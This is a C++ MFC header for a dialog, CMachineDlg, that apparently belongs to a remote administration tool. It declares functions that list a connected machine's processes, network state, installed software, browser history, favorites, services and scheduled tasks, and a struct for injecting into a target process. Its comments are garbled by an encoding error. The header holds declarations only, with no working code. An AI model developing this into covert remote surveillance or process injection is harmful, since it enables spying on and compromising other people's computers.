
#pragma once

/////////////////////////////////////////////////////////////////////////////
// CMachineDlg dialog






class CMachineDlg : public CXTPResizeDialog
{
	// Construction
public:
	CMachineDlg(CWnd* pParent = NULL, ISocketBase* pIOCPServer = NULL, ClientContext* pContext = NULL);   // standard constructor
	

	// Dialog Data
		//{{AFX_DATA(CMachineDlg)
	enum { IDD = IDD_MACHINE };
	CXTPListCtrl	m_list;
	CXTPTabCtrl m_tab;
	// NOTE: the ClassWizard will add data members here
//}}AFX_DATA
	CXTHeaderCtrl   m_heades;

	void OnReceiveComplete();
	void OnReceive();
	// Overrides
		// ClassWizard generated virtual function overrides
		//{{AFX_VIRTUAL(CMachineDlg)

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void PostNcDestroy();
	virtual void OnCancel();

	virtual BOOL OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult);
	//}}AFX_VIRTUAL

	int             m_nSortedCol;
	bool            m_bAscending;
	// Implementation
protected:
	ClientContext* m_pContext;
	ISocketBase* m_iocpServer;
	HICON m_hIcon;
	BOOL m_bOnClose;
	CMainFrame* pFrame;
	CXTPStatusBar m_wndStatusBar;
	CString strMsgShow;

	//char* TcharToChar(const TCHAR* tchar, char* _char);
	//TCHAR* CharToTchar(const char* _char, TCHAR* tchar);
   // Generated message map functions
   //{{AFX_MSG(CMachineDlg)
	//afx_msg void OnClose();
	virtual BOOL OnInitDialog();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnDblclkList(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnRclickList(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnSelChangeTab(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnSelChangingTab(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg LRESULT OnShowMessage(WPARAM wParam, LPARAM lParam); // �Զ�����Ϣ
	void SortColumn(int iCol, bool bAsc);
	CString oleTime2Str(double time);
	void reflush();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
public:
	void SendToken(BYTE bToken);
	void AdjustList();
	void OpenInfoDlg();
	 void SetClipboardText(CString& Data);
	 CString __MakePriority(DWORD dwPriClass);
	void DeleteList();
	void ShowProcessList(); //����
	void ShowWindowsList();//����
	void ShowNetStateList();//����
	void ShowSoftWareList();//����б�
	void ShowIEHistoryList();//html�����¼
	void ShowFavoritesUrlList();//�ղؼ�
	void ShowServiceList(); //����
	void ShowTaskList();//�ƻ�����
	void ShowHostsList();//HOSTS

	//��Ӧ�˵�
	void ShowProcessList_menu(); //����
	void ShowWindowsList_menu();//����
	void ShowNetStateList_menu();//����
	void ShowSoftWareList_menu();//����б�
	void ShowIEHistoryList_menu();//html�����¼
	void ShowFavoritesUrlList_menu();//�ղؼ�
	void ShowServiceList_menu();//����
	void ShowTaskList_menu();//�ƻ�����
	void ShowHostsList_menu();//HOSTS


};




struct  Browsinghistory
{
	TCHAR strTime[100];
	TCHAR strTitle[1024];
	TCHAR strUrl[1024];

};

struct  InjectData
{
	DWORD ExeIsx86;
	DWORD mode;		//ע��ģʽ
	DWORD dwProcessID;//����ID
	DWORD datasize;   //�������ݳߴ�
	TCHAR strpath[1024]; //Զ�����Ŀ¼
};